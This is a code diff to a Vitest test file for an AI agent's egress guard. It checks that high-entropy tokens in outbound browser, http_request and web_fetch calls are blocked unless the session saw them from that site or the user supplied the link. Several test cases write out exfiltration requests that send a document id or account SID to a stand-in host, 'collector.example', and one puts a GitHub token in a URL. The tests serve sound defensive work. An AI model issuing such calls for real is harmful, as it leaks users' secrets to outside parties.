@@ -5,7 +5,8 @@
 // because that page never showed the agent the user's secret.
 import { afterEach, describe, expect, it } from "vitest";
 
-import { _clearSiteProvenance, recordSiteTokens } from "./site-provenance.js";
+import { _clearSiteProvenance, recordSiteTokens, recordUserLinks } from "./site-provenance.js";
+import { ToolChainAnalyzer } from "../threat/tool-chain.js";
 import { probeEgressGuard } from "../tool-execution/egress-gates.js";
 import type { ToolCallContext } from "../tool-execution/context.js";
 
@@ -15,10 +16,11 @@ const CONSOLE = `https://1console.twilio.com/account/${SID}`;
 // Random, no known key prefix: only the entropy pass can see it.
 const UNSEEN = "q8Zr2LmX7vTn4KpW9sYb3HdJ6fGc1NaE";
 
-function browserCall(args: Record<string, unknown>) {
-  const ctx = { tc: { id: "tc-1", name: "browser", arguments: JSON.stringify(args) }, args, sessionId: SESSION } as unknown as ToolCallContext;
+function call(name: string, args: Record<string, unknown>) {
+  const ctx = { tc: { id: "tc-1", name, arguments: JSON.stringify(args) }, args, sessionId: SESSION } as unknown as ToolCallContext;
   return probeEgressGuard(ctx);
 }
+const browserCall = (args: Record<string, unknown>) => call("browser", args);
 
 afterEach(() => _clearSiteProvenance());
 
@@ -63,5 +65,40 @@ describe("everything else is judged as before", () => {
     const githubToken = "ghp_" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8";
     recordSiteTokens(SESSION, "https://github.com/settings/tokens", githubToken);
     expect(browserCall({ action: "navigate", url: `https://github.com/x?t=${githubToken}` })?.reason).toMatch(/GitHub/i);
+  });
+});
+
+// The same rule holds for every source the session saw and every outbound
+// scan that names a destination, or the scans disagree: a link the user pasted
+// was refused on navigate, and an http_request the egress gate allowed was
+// re-judged as exfiltration by the threat engine after it ran.
+describe("one provenance rule across sources and scans", () => {
+  const DOC_ID = "1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgvE2upms";
+  const DOC = `https://docs.google.com/document/d/${DOC_ID}/edit`;
+  const API = `https://api.twilio.com/2010-04-01/Accounts/${SID}/Calls.json`;
+
+  it("vouches for an id in a link the user typed, to that link's site only", () => {
+    expect(browserCall({ action: "navigate", url: DOC })?.reason).toMatch(/High-Entropy Token/);
+    recordUserLinks(SESSION, `can you summarize ${DOC}, thanks`);
+    expect(browserCall({ action: "navigate", url: DOC })).toBeNull();
+    expect(browserCall({ action: "navigate", url: `https://collector.example/?d=${DOC_ID}` })?.reason).toMatch(/High-Entropy Token/);
+  });
+
+  it("applies to http_request and web_fetch destinations, not just the browser", () => {
+    expect(call("http_request", { url: API, method: "GET" })?.reason).toMatch(/High-Entropy Token/);
+    expect(call("web_fetch", { url: DOC })?.reason).toMatch(/High-Entropy Token/);
+    recordSiteTokens(SESSION, "https://console.twilio.com/home", `Account SID ${SID}`);
+    recordUserLinks(SESSION, DOC);
+    expect(call("http_request", { url: API, method: "GET" })).toBeNull();
+    expect(call("web_fetch", { url: DOC })).toBeNull();
+  });
+
+  it("the threat engine's post-call scan agrees with the gate", () => {
+    const chain = new ToolChainAnalyzer(SESSION);
+    const clean = { labels: [], confidence: 0 };
+    expect(chain.recordAndAnalyze("http_request", { url: API, method: "GET" }, clean).exfil).toBeTruthy();
+    recordSiteTokens(SESSION, "https://console.twilio.com/home", `Account SID ${SID}`);
+    expect(new ToolChainAnalyzer(SESSION).recordAndAnalyze("http_request", { url: API, method: "GET" }, clean).exfil).toBeFalsy();
+    expect(new ToolChainAnalyzer(SESSION).recordAndAnalyze("http_request", { url: `https://collector.example/?k=${SID}`, method: "GET" }, clean).exfil).toBeTruthy();
   });
 });
